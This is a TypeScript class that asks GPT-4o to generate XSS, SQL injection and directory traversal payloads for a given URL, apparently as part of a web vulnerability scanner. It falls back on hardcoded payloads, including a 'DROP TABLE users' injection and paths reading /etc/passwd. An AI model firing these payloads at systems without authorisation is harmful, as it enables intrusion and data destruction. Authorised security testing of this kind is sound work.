import OpenAI from "openai";

export class AIPayloadGenerator {
  private openai: OpenAI;

  constructor() {
    // the newest OpenAI model is "gpt-4o" which was released May 13, 2024. do not change this unless explicitly requested by the user
    this.openai = new OpenAI({ 
      apiKey: process.env.OPENAI_API_KEY || process.env.OPENAI_API_KEY_ENV_VAR || "sk-test-key"
    });
  }

  async generateXSSPayloads(targetUrl: string): Promise<string[]> {
    try {
      const response = await this.openai.chat.completions.create({
        model: "gpt-4o",
        messages: [
          {
            role: "system",
            content: "You are a cybersecurity expert specializing in XSS vulnerability testing. Generate realistic XSS payloads for ethical security testing. Respond with JSON containing an array of payloads."
          },
          {
            role: "user",
            content: `Generate 5 XSS payloads for testing the URL: ${targetUrl}. Focus on different XSS techniques like script injection, event handlers, and HTML injection. Return JSON format: {"payloads": ["payload1", "payload2", ...]}`
          }
        ],
        response_format: { type: "json_object" },
      });

      const result = JSON.parse(response.choices[0].message.content || '{"payloads": []}');
      return result.payloads || this.getBasicXSSPayloads();
    } catch (error) {
      console.error("Error generating AI XSS payloads:", error);
      return this.getBasicXSSPayloads();
    }
  }

  async generateSQLIPayloads(targetUrl: string): Promise<string[]> {
    try {
      const response = await this.openai.chat.completions.create({
        model: "gpt-4o",
        messages: [
          {
            role: "system",
            content: "You are a cybersecurity expert specializing in SQL injection testing. Generate realistic SQL injection payloads for ethical security testing. Respond with JSON containing an array of payloads."
          },
          {
            role: "user",
            content: `Generate 5 SQL injection payloads for testing the URL: ${targetUrl}. Include different techniques like union-based, error-based, and boolean-based SQL injection. Return JSON format: {"payloads": ["payload1", "payload2", ...]}`
          }
        ],
        response_format: { type: "json_object" },
      });

      const result = JSON.parse(response.choices[0].message.content || '{"payloads": []}');
      return result.payloads || this.getBasicSQLIPayloads();
    } catch (error) {
      console.error("Error generating AI SQL injection payloads:", error);
      return this.getBasicSQLIPayloads();
    }
  }

  async generateDirectoryTraversalPayloads(targetUrl: string): Promise<string[]> {
    try {
      const response = await this.openai.chat.completions.create({
        model: "gpt-4o",
        messages: [
          {
            role: "system",
            content: "You are a cybersecurity expert specializing in directory traversal testing. Generate realistic directory traversal payloads for ethical security testing. Respond with JSON containing an array of payloads."
          },
          {
            role: "user",
            content: `Generate 3 directory traversal payloads for testing the URL: ${targetUrl}. Include different encoding techniques and path variations. Return JSON format: {"payloads": ["payload1", "payload2", ...]}`
          }
        ],
        response_format: { type: "json_object" },
      });

      const result = JSON.parse(response.choices[0].message.content || '{"payloads": []}');
      return result.payloads || this.getBasicDirectoryTraversalPayloads();
    } catch (error) {
      console.error("Error generating AI directory traversal payloads:", error);
      return this.getBasicDirectoryTraversalPayloads();
    }
  }

  private getBasicXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>'
    ];
  }

  private getBasicSQLIPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' UNION SELECT 1,2,3--",
      "'; DROP TABLE users; --",
      "' OR 1=1 LIMIT 1 --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1"
    ];
  }

  private getBasicDirectoryTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ];
  }
}
